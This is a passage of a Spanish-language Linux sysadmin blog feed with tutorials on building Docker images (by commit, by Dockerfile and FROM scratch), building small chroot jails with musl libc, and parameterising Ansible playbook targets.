&lt;h2&gt;Mejorando las imágenes con capas&lt;/h2&gt;
&lt;p&gt;Las imágenes que podemos encontrar en &lt;a href="https://hub.docker.com/"&gt;Docker Hub&lt;/a&gt; son básicas; por ejemplo vienen sin un servidor &lt;strong&gt;ssh&lt;/strong&gt; y sin &lt;strong&gt;python&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ docker run -ti --rm debian python -V
docker: Error response from daemon: Container &lt;span class="nb"&gt;command&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;python&amp;#39;&lt;/span&gt; not found or does not exist..
            gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Normalmente nos va a interesar trabajar con imágenes que ya contengan algunas de nuestras utilidades habituales. Para ello podemos construir una imagen a partir de otra que ya tengamos.&lt;/p&gt;
&lt;p&gt;Para ampliar una imagen modificando otra hay dos formas, que se explican a continuación. Para entender los ejemplos, vamos a suponer que ampliamos la imagen &lt;em&gt;debian&lt;/em&gt; con el paquete &lt;em&gt;python&lt;/em&gt;.&lt;/p&gt;
&lt;h3&gt;Creando una imagen instalando manualmente las diferencias&lt;/h3&gt;
&lt;p&gt;Para hacer esta, se necesita levantar un contenedor que vamos a modificar. Luego localizamos el identificador del contenedor y le damos un &lt;em&gt;commit&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Empezamos de la imagen base &lt;em&gt;debian&lt;/em&gt;, a la que instalamos los paquetes necesarios. En este caso, vamos a poner &lt;em&gt;python&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ docker run -ti --rm debian
root@23c4caa12410:/# apt-get update
...
root@23c4caa12410:/# apt-get install -y python
...
root@23c4caa12410:/# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora, y desde otro terminal, buscamos el identificador del contenedor.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
23c4caa12410        debian              &lt;span class="s2"&gt;&amp;quot;/bin/bash&amp;quot;&lt;/span&gt;         &lt;span class="m"&gt;4&lt;/span&gt; minutes ago       Up &lt;span class="m"&gt;4&lt;/span&gt; minutes                            backstabbing_poincare
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Teniendo el identificador del contenedor, podemos hacer un &lt;em&gt;commit&lt;/em&gt; y podemos ponerle un &lt;em&gt;tag&lt;/em&gt; para referencias futuras.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ docker commit 23c4caa12410
sha256:f73b2072ab7404b83749fd098411a1c6392631668363c46fc7203d1a0d39782f
gerard@sirius:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
&amp;lt;none&amp;gt;              &amp;lt;none&amp;gt;              f73b2072ab74        &lt;span class="m"&gt;9&lt;/span&gt; seconds ago       &lt;span class="m"&gt;167&lt;/span&gt;.4 MB
debian              latest              bb5d89f9b6cb        &lt;span class="m"&gt;4&lt;/span&gt; days ago          &lt;span class="m"&gt;125&lt;/span&gt;.1 MB
gerard@sirius:~$ docker tag f73b2072ab74 python-debian-manual
gerard@sirius:~$ docker images
REPOSITORY             TAG                 IMAGE ID            CREATED              SIZE
python-debian-manual   latest              f73b2072ab74        About a minute ago   &lt;span class="m"&gt;167&lt;/span&gt;.4 MB
debian                 latest              bb5d89f9b6cb        &lt;span class="m"&gt;4&lt;/span&gt; days ago           &lt;span class="m"&gt;125&lt;/span&gt;.1 MB
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y comprobamos que funciona como debe:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ docker run -ti --rm python-debian-manual python -V
Python &lt;span class="m"&gt;2&lt;/span&gt;.7.9
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Creando una imagen automáticamente mediante Dockerfiles&lt;/h3&gt;
&lt;p&gt;Para este método vamos a usar el comando &lt;strong&gt;docker build&lt;/strong&gt; que construye una imagen a partir de un &lt;em&gt;Dockerfile&lt;/em&gt;, que le sirve de receta, y construye imágenes a partir de otras.&lt;/p&gt;
&lt;p&gt;Supongamos que tenemos el siguiente &lt;em&gt;Dockerfile&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ cat Dockerfile 
FROM debian
RUN apt-get update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    apt-get install -y python
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/bash&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Bastaría crear la imágen en la carpeta actual con el comando mencionado, especificando opcionalmente el &lt;em&gt;tag&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ docker build -t python-debian-auto .
Sending build context to Docker daemon &lt;span class="m"&gt;2&lt;/span&gt;.048 kB
Step &lt;span class="m"&gt;1&lt;/span&gt; : FROM debian
 ---&amp;gt; bb5d89f9b6cb
Step &lt;span class="m"&gt;2&lt;/span&gt; : RUN apt-get update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     apt-get install -y python
 ---&amp;gt; Running in 4e975dc297fc
...  
 ---&amp;gt; 39025d968357
Removing intermediate container 4e975dc297fc
Step &lt;span class="m"&gt;3&lt;/span&gt; : CMD /bin/bash
 ---&amp;gt; Running in 7331c2d109db
 ---&amp;gt; e52f43de8b80
Removing intermediate container 7331c2d109db
Successfully built e52f43de8b80
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Comprobamos que tenemos una imagen nueva y que funciona.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ docker images
REPOSITORY             TAG                 IMAGE ID            CREATED             SIZE
python-debian-auto     latest              e52f43de8b80        &lt;span class="m"&gt;6&lt;/span&gt; minutes ago       &lt;span class="m"&gt;176&lt;/span&gt; MB
python-debian-manual   latest              f73b2072ab74        &lt;span class="m"&gt;22&lt;/span&gt; minutes ago      &lt;span class="m"&gt;167&lt;/span&gt;.4 MB
debian                 latest              bb5d89f9b6cb        &lt;span class="m"&gt;4&lt;/span&gt; days ago          &lt;span class="m"&gt;125&lt;/span&gt;.1 MB
gerard@sirius:~/build$ docker run -ti --rm python-debian-auto python -V
Python &lt;span class="m"&gt;2&lt;/span&gt;.7.9
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Creando una imagen desde cero&lt;/h2&gt;
&lt;p&gt;Hay veces en las que no queremos usar imágenes de dudoso origen, y queremos hacer una nuestra. En estos casos solo hay que saber que una imagen no es otra cosa que una jaula normal. Podemos hacer esto partiendo de una imagen vacía, pensada para estos casos.&lt;/p&gt;
&lt;p&gt;Como ejemplo, vamos a crear una jaula con lo necesario para correr un solo comando: el ejemplo que utilizamos en &lt;a href="http://www.linuxsysadmin.ml/2016/05/reduciendo-el-tamano-de-nuestros-binarios-con-musl-libc.html"&gt;otro artículo&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Vamos a utilizar el método del &lt;em&gt;Dockerfile&lt;/em&gt;, añadiendo el binario estático.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ cat Dockerfile 
FROM scratch
ADD hello /
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/hello&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Construimos la imagen y vemos que ocupa lo mismo que el binario que le hemos puesto.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ docker build -t saluda .
Sending build context to Docker daemon &lt;span class="m"&gt;20&lt;/span&gt;.34 MB
Step &lt;span class="m"&gt;1&lt;/span&gt; : FROM scratch
 ---&amp;gt; 
Step &lt;span class="m"&gt;2&lt;/span&gt; : ADD hello /
 ---&amp;gt; 83da41eee33c
Removing intermediate container 5ea901ba61be
Step &lt;span class="m"&gt;3&lt;/span&gt; : CMD /hello
 ---&amp;gt; Running in 54d7512dd61a
 ---&amp;gt; bf6c560144dd
Removing intermediate container 54d7512dd61a
Successfully built bf6c560144dd
gerard@sirius:~/build$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
saluda              latest              bf6c560144dd        &lt;span class="m"&gt;25&lt;/span&gt; seconds ago      &lt;span class="m"&gt;5&lt;/span&gt;.416 kB
debian              latest              47af6ca8a14a        &lt;span class="m"&gt;3&lt;/span&gt; weeks ago         &lt;span class="m"&gt;125&lt;/span&gt;.1 MB
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Probamos que funciona, como ya viene siendo costumbre:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/build$ docker run --rm -ti saluda
Hello world!
gerard@sirius:~/build$ 
&lt;/pre&gt;&lt;/div&gt;</content><category term="linux"></category><category term="docker"></category><category term="contenedor"></category><category term="dockerfile"></category><category term="jaula"></category></entry><entry><title>Reduciendo el tamaño de nuestros binarios con musl libc</title><link href="http://www.linuxsysadmin.ml/2016/05/reduciendo-el-tamano-de-nuestros-binarios-con-musl-libc.html" rel="alternate"></link><published>2016-05-16T13:00:00+02:00</published><updated>2016-05-16T13:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-05-16:/2016/05/reduciendo-el-tamano-de-nuestros-binarios-con-musl-libc.html</id><summary type="html">&lt;p&gt;Cuando construimos jaulas, por el motivo que sea, vemos que no quedan pequeñas. El problema es el conjunto de librerías que hay que poner en el caso de los binarios &lt;em&gt;dinámicos&lt;/em&gt;, o el exceso de tamaño en el caso de los &lt;em&gt;estáticos&lt;/em&gt;. Cambiando la librería base, podemos reducir su tamaño …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando construimos jaulas, por el motivo que sea, vemos que no quedan pequeñas. El problema es el conjunto de librerías que hay que poner en el caso de los binarios &lt;em&gt;dinámicos&lt;/em&gt;, o el exceso de tamaño en el caso de los &lt;em&gt;estáticos&lt;/em&gt;. Cambiando la librería base, podemos reducir su tamaño.&lt;/p&gt;
&lt;p&gt;La mayoría de los binarios de un sistema &lt;em&gt;linux&lt;/em&gt; necesitan una librería llamada &lt;em&gt;libc&lt;/em&gt;. La que suelen poner en todas las distribuciones es la &lt;strong&gt;GNU libc&lt;/strong&gt;, que es compatible con todos los proyectos de software libre y no suele dar problemas.&lt;/p&gt;
&lt;p&gt;Sin embargo, no es la única; si tenemos un binario que se puede compilar con estas otras librerías, la reducción de tamaño suele ser importante. Esto no nos preocupa en un sistema "normal" porque el disco es barato, pero es frustrante cuando tenemos que cargar cientos de megas para poner solamente un par de servicios en una jaula.&lt;/p&gt;
&lt;p&gt;Así que vamos a crear una jaula usando &lt;strong&gt;musl libc&lt;/strong&gt; como demostración, para ver como se reducen la cantidad de librerías y el tamaño de la jaula.&lt;/p&gt;
&lt;h2&gt;El compilador que enlaza con musl libc&lt;/h2&gt;
&lt;p&gt;La librería de &lt;strong&gt;musl libc&lt;/strong&gt; puede usarse de dos formas: construir una &lt;em&gt;toolchain&lt;/em&gt; dedicada o usar un &lt;em&gt;wrapper&lt;/em&gt; de la que tengamos en el sistema. Como la primera merecería un artículo por sí misma, usaremos la segunda. Es digno de mención indicar que existen &lt;em&gt;toolchains&lt;/em&gt; prefabricadas.&lt;/p&gt;
&lt;p&gt;El procedimiento para instalar el &lt;em&gt;wrapper&lt;/em&gt; de &lt;strong&gt;musl libc&lt;/strong&gt; es relativamente simple; se trata del típico procedimiento &lt;em&gt;configure &amp;amp;&amp;amp; make &amp;amp;&amp;amp; make install&lt;/em&gt;. Para ello vamos a necesitar algunas herramientas:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@musl:~# apt-get install wget gcc make
...
root@musl:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nos descargamos la versión de &lt;strong&gt;musl libc&lt;/strong&gt; que queramos utilizar usando el comando &lt;em&gt;wget&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@musl:~# wget https://www.musl-libc.org/releases/musl-1.1.14.tar.gz
...
root@musl:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Descomprimimos el &lt;em&gt;tarball&lt;/em&gt; descargado y nos ponemos en la carpeta creada.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@musl:~# tar xzf musl-1.1.14.tar.gz
root@musl:~# &lt;span class="nb"&gt;cd&lt;/span&gt; musl-1.1.14
root@musl:~/musl-1.1.14#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a configurar el paquete, con lo que se va a generar un &lt;em&gt;Makefile&lt;/em&gt; compatible con nuestro sistema. Es un buen momento para indicar la carpeta que va a contener el "compilador".&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@musl:~/musl-1.1.14# ./configure --prefix&lt;span class="o"&gt;=&lt;/span&gt;/opt/musl/
...
root@musl:~/musl-1.1.14#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Una vez obtenido el &lt;em&gt;Makefile&lt;/em&gt;, podemos construir el "compilador" con la orden &lt;em&gt;make&lt;/em&gt;. Si tenéis la suerte de contar con mas de un procesador, podéis acelerar este paso con el &lt;em&gt;flag&lt;/em&gt; &lt;strong&gt;-j2&lt;/strong&gt;, por ejemplo (serían dos threads); lo ideal poner el número de núcleos disponibles.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@musl:~/musl-1.1.14# make
...
root@musl:~/musl-1.1.14#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con los binarios construidos, los ponemos en su sitio con &lt;em&gt;make install&lt;/em&gt;. Puesto que indicamos un &lt;em&gt;prefix&lt;/em&gt; en el &lt;em&gt;configure&lt;/em&gt;, va a crear esa carpeta, creando en ella las carpetas necesarias (por ejemplo, &lt;em&gt;bin&lt;/em&gt; y &lt;em&gt;lib&lt;/em&gt;).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@musl:~/musl-1.1.14# make install
...
root@musl:~/musl-1.1.14#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Cuando el &lt;em&gt;make install&lt;/em&gt; haya funcionado, podemos salir de la carpeta de fuentes y eliminarla. En este caso, lo importante ha quedado en &lt;em&gt;/opt/musl/&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@musl:~/musl-1.1.14# &lt;span class="nb"&gt;cd&lt;/span&gt; ..
root@musl:~# rm -R musl-1.1.14*
root@musl:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Construyendo una jaula de ejemplo&lt;/h2&gt;
&lt;p&gt;Supongamos que tenemos un código fuente de un ejecutable que queremos en la jaula. En este caso vamos a hacer un sencillo programa:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@musl:~# cat hello.c
&lt;span class="c1"&gt;#include &amp;quot;stdio.h&amp;quot;&lt;/span&gt;
&lt;span class="c1"&gt;#include &amp;quot;stdlib.h&amp;quot;&lt;/span&gt;

int main&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    printf&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Hello world!\n&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    exit&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
root@musl:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Versión estática&lt;/h3&gt;
&lt;p&gt;Compilamos nuestro binario con el &lt;em&gt;flag&lt;/em&gt; &lt;strong&gt;-static&lt;/strong&gt;. Eso hace que el binario incluya lo que necesita de &lt;strong&gt;musl libc&lt;/strong&gt;, con lo que no va a necesitar ninguna librería de sistema. Este binario debería funcionar en todas las máquinas con la misma arquitectura (en mi caso, x86). No os olvidéis del &lt;em&gt;strip&lt;/em&gt;, que va a eliminar los símbolos de &lt;em&gt;debug&lt;/em&gt; y reduce el tamaño del binario.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@musl:~# /opt/musl/bin/musl-gcc -static -o hello hello.c
root@musl:~# strip hello
root@musl:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Creamos una carpeta para la jaula, en la que ponemos nuestro ejecutable, sin nada mas, porque no lo necesita.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@musl:~# mkdir jail_static
root@musl:~# cp hello jail_static/
root@musl:~# tree jail_static/ -h
jail_static/
└── &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;.9K&lt;span class="o"&gt;]&lt;/span&gt;  hello

&lt;span class="m"&gt;0&lt;/span&gt; directories, &lt;span class="m"&gt;1&lt;/span&gt; file
root@musl:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lanzamos un &lt;em&gt;chroot&lt;/em&gt; que va modificar la percepción de las carpetas; a todos los efectos, &lt;em&gt;jail_static/&lt;/em&gt; va a ser &lt;em&gt;/&lt;/em&gt; mientras el comando lanzado no acabe. Esto implica que nuestro binario estaría en la raíz de la jaula.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@musl:~# chroot jail_static/ /hello
Hello world!
root@musl:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vemos que funciona y que solo hemos necesitado 5 kilobytes para nuestra jaula. Obviamente, vamos a necesitar algo mas para poner un servicio completo.&lt;/p&gt;
&lt;p&gt;Hay que indicar que varios binarios posiblemente llevarían incrustados los mismos pedazos de &lt;strong&gt;musl libc&lt;/strong&gt; duplicando código, y que para actualizar la librería habría que recompilarlos todos con la nueva versión.&lt;/p&gt;
&lt;h3&gt;Versión dinámica&lt;/h3&gt;
&lt;p&gt;Que nuestro binario sea dinámico implica que no incluye ningún código de &lt;strong&gt;musl libc&lt;/strong&gt;, así que la va a necesitar cerca para funcionar. La ventaja es los binarios son independientes de la librería usada, que podemos actualizar simplemente cambiándola por la nueva, sin recompilar los binarios.&lt;/p&gt;
&lt;p&gt;Para compilar este caso no vamos a indicar ningún &lt;em&gt;flag&lt;/em&gt; de compilación, ya que el formato dinámico es el habitual.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@musl:~# /opt/musl/bin/musl-gcc -o hello hello.c
root@musl:~# strip hello
root@musl:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La parte mala es que este binario no funciona sin sus librerías, que podemos buscar con &lt;em&gt;ldd&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@musl:~# ldd hello
./hello: error &lt;span class="k"&gt;while&lt;/span&gt; loading shared libraries: /usr/lib/i386-linux-gnu/libc.so: invalid ELF header
root@musl:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Desgraciadamente, el &lt;em&gt;ldd&lt;/em&gt; del sistema funciona con la librería del sistema. La funcionalidad del &lt;em&gt;ldd&lt;/em&gt; para &lt;strong&gt;musl libc&lt;/strong&gt; la proporciona la misma librería, siempre que se llame &lt;em&gt;ldd&lt;/em&gt;. Hacer un enlace nos basta.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@musl:~# ln -s /opt/musl/lib/libc.so ldd
root@musl:~# ./ldd hello
        /lib/ld-musl-i386.so.1 (0xb7757000)
        libc.so =&amp;gt; /lib/ld-musl-i386.so.1 (0xb7757000)
root@musl:~# ldd /lib/ld-musl-i386.so.1
        statically linked
root@musl:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como vemos, nuestro binario necesita el fichero &lt;em&gt;/lib/ld-musl-i386.so.1&lt;/em&gt;, y este a ninguno mas. Con esta información podemos montar la jaula. Cabe decir que la librería puede reducirse con el comando &lt;em&gt;strip&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@musl:~# mkdir jail_dynamic
root@musl:~# mkdir jail_dynamic/lib
root@musl:~# cp hello jail_dynamic/
root@musl:~# cp /lib/ld-musl-i386.so.1 jail_dynamic/lib/
root@musl:~# strip jail_dynamic/lib/ld-musl-i386.so.1
root@musl:~# tree jail_dynamic/ -h
jail_dynamic/
├── &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.2K&lt;span class="o"&gt;]&lt;/span&gt;  hello
└── &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;.0K&lt;span class="o"&gt;]&lt;/span&gt;  lib
    └── &lt;span class="o"&gt;[&lt;/span&gt;531K&lt;span class="o"&gt;]&lt;/span&gt;  ld-musl-i386.so.1

&lt;span class="m"&gt;1&lt;/span&gt; directory, &lt;span class="m"&gt;2&lt;/span&gt; files
root@musl:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y como es de esperar, la jaula funciona como se espera:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@musl:~# chroot jail_dynamic/ /hello
Hello world!
root@musl:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso, la jaula ocupa mas que la versión estática. En el caso de haber mas binarios, podría salirnos a cuenta; desde luego, en este caso no hay beneficio ninguno, y además tenemos una complejidad adicional. Valorad cada caso individualmente.&lt;/p&gt;</content><category term="linux"></category><category term="musl"></category><category term="libc"></category><category term="chroot"></category><category term="jaula"></category></entry><entry><title>Algunas ideas sueltas sobre Ansible</title><link href="http://www.linuxsysadmin.ml/2016/05/algunas-ideas-sueltas-sobre-ansible.html" rel="alternate"></link><published>2016-05-09T08:00:00+02:00</published><updated>2016-05-09T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-05-09:/2016/05/algunas-ideas-sueltas-sobre-ansible.html</id><summary type="html">&lt;p&gt;En un &lt;a href="http://www.linuxsysadmin.ml/2016/04/instalando-ansible-para-gestionar-servidores.html"&gt;artículo anterior&lt;/a&gt; vimos qué era &lt;strong&gt;Ansible&lt;/strong&gt; y como instalarlo, dejando su funcionamiento para el lector; Hay miles de tutoriales por internet, y muchos son mejores de los que pueda poner aquí. Sin embargo, hay algunas ideas que no son fáciles de ver juntas, así que aquí las dejo …&lt;/p&gt;</summary><content type="html">&lt;p&gt;En un &lt;a href="http://www.linuxsysadmin.ml/2016/04/instalando-ansible-para-gestionar-servidores.html"&gt;artículo anterior&lt;/a&gt; vimos qué era &lt;strong&gt;Ansible&lt;/strong&gt; y como instalarlo, dejando su funcionamiento para el lector; Hay miles de tutoriales por internet, y muchos son mejores de los que pueda poner aquí. Sin embargo, hay algunas ideas que no son fáciles de ver juntas, así que aquí las dejo.&lt;/p&gt;
&lt;h2&gt;Playbooks plantilla&lt;/h2&gt;
&lt;p&gt;Si solo queremos los &lt;em&gt;playbooks&lt;/em&gt; como una manera fácil de aprovisionar una máquina, nos conviene que no tenga un &lt;em&gt;host&lt;/em&gt; asignado en el mismo, para poder pasar el objetivo por parámetro. Por ejemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# cat ping.yml
- hosts: &lt;span class="s1"&gt;&amp;#39;{{ target }}&amp;#39;&lt;/span&gt;
  tasks:
    - ping:
root@ansible:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso hay que pasar un argumento extra como &lt;em&gt;target&lt;/em&gt;, y en caso de no ponerlo, el &lt;em&gt;playbook&lt;/em&gt; no haría nada. Con este truco, podemos ir variando el objetivo, siempre que esté en el fichero &lt;em&gt;hosts&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ansible:~# ansible-playbook ping.yml

PLAY &lt;span class="o"&gt;[{{&lt;/span&gt; target &lt;span class="o"&gt;}}]&lt;/span&gt; ***********************************************************
skipping: no hosts matched

PLAY RECAP ********************************************************************

root@ansible:~# ansible-playbook ping.yml --extra-vars &lt;span class="s2"&gt;&amp;quot;target=appservers&amp;quot;&lt;/span&gt;

PLAY &lt;span class="o"&gt;[&lt;/span&gt;appservers&lt;span class="o"&gt;]&lt;/span&gt; *************************************************************

GATHERING FACTS ***************************************************************
ok: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3&lt;span class="o"&gt;]&lt;/span&gt;
ok: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.0.0.4&lt;span class="o"&gt;]&lt;/span&gt;

TASK: &lt;span class="o"&gt;[&lt;/span&gt;ping &lt;span class="o"&gt;]&lt;/span&gt; *****************************************************************
ok: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.0.0.4&lt;span class="o"&gt;]&lt;/span&gt;
ok: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3&lt;span class="o"&gt;]&lt;/span&gt;

PLAY RECAP ********************************************************************
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3                   : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.4                   : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;

root@ansible:~# ansible-playbook ping.yml --extra-vars &lt;span class="s2"&gt;&amp;quot;target=10.0.0.3&amp;quot;&lt;/span&gt;

PLAY &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3&lt;span class="o"&gt;]&lt;/span&gt; ***************************************************************

GATHERING FACTS ***************************************************************
ok: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3&lt;span class="o"&gt;]&lt;/span&gt;

TASK: &lt;span class="o"&gt;[&lt;/span&gt;ping &lt;span class="o"&gt;]&lt;/span&gt; *****************************************************************
ok: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3&lt;span class="o"&gt;]&lt;/span&gt;

PLAY RECAP ********************************************************************
